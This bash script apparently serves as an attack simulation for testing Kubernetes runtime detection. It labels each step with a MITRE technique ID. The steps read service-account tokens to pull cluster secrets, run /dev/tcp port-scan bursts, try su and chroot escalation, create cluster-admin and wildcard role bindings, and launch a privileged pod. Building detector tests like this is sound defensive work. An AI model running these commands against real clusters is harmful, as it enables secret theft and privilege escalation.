#!/bin/bash
set -x

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "### T1021 + T1059: remote exec + shell ###"
kubectl exec attacker -- bash -c "id && whoami"
sleep 2

echo "### T1610: lateral network scan burst (5 distinct pods) ###"
kubectl apply -f "$SCRIPT_DIR/scan-targets.yaml" > /dev/null
kubectl wait --for=condition=Ready pod -l app=scan-targets --timeout=60s > /dev/null 2>&1
mapfile -t TARGET_IPS < <(kubectl get pods -l app=scan-targets -o wide --no-headers | awk '{print $6}' | sort -u)
if [ "${#TARGET_IPS[@]}" -lt 5 ]; then
  echo "WARNING: only found ${#TARGET_IPS[@]} scan-target pod IPs (need 5) — skipping T1610 step"
else
  for ip in "${TARGET_IPS[@]}"; do
    kubectl exec attacker -- bash -c "exec 3<>/dev/tcp/${ip}/80; sleep 6; exec 3<&-" &
  done
  wait
fi
sleep 2

echo "### T1552: secret access (right after T1610 -> fires T1059->T1610->T1552 CRITICAL chain) ###"
kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets'
sleep 3

echo "### T1548: privilege escalation (su) ###"
kubectl exec attacker -- su root -c "id"
sleep 1

echo "### T1611: container escape indicator (chroot) ###"
kubectl exec attacker -- chroot / /bin/true
sleep 1

echo "### T1552 again: secret access right after T1611 -> fires T1611->T1552 and T1059->T1548->T1611 CRITICAL chains ###"
kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/secrets'
sleep 3

echo "### T1496: cryptomining process signature (dummy xmrig binary) ###"
kubectl exec attacker -- bash -c "cp /bin/true /tmp/xmrig2 && chmod +x /tmp/xmrig2 && /tmp/xmrig2"
sleep 2

echo "### T1499: fork-bomb-like exec burst (30 execs fast) ###"
kubectl exec attacker -- bash -c 'for i in $(seq 1 30); do /bin/true; done'
sleep 2

echo "### T1613: RBAC/resource discovery burst (10 reads in <30s) ###"
for i in $(seq 1 10); do
  kubectl exec attacker -- bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/apis/rbac.authorization.k8s.io/v1/clusterroles' > /dev/null 2>&1
done
sleep 3

echo "### T1548.005: RBAC abuse - new cluster-admin binding + wildcard ClusterRole ###"
kubectl create clusterrolebinding demo-t1548-005-v2 --clusterrole=cluster-admin --serviceaccount=default:legitimate-app 2>&1
kubectl create clusterrole god-mode-v2 --verb="*" --resource="*" 2>&1
sleep 3

echo "### T1548-PRIV-POD: privileged pod creation ###"
# Delete any leftover pod from a prior run first: kubectl apply against an
# already-existing pod issues verb=patch, not verb=create, which the T1548
# detector requires — this makes every 2nd/3rd ablation-mode re-run silently
# stop firing this technique unless the pod is gone beforehand.
kubectl delete pod priv-pod-demo --ignore-not-found=true > /dev/null 2>&1
kubectl apply -f - << 'PODEOF'
apiVersion: v1
kind: Pod
metadata:
  name: priv-pod-demo
spec:
  containers:
  - name: priv
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true
PODEOF
sleep 3

echo "### DONE ###"
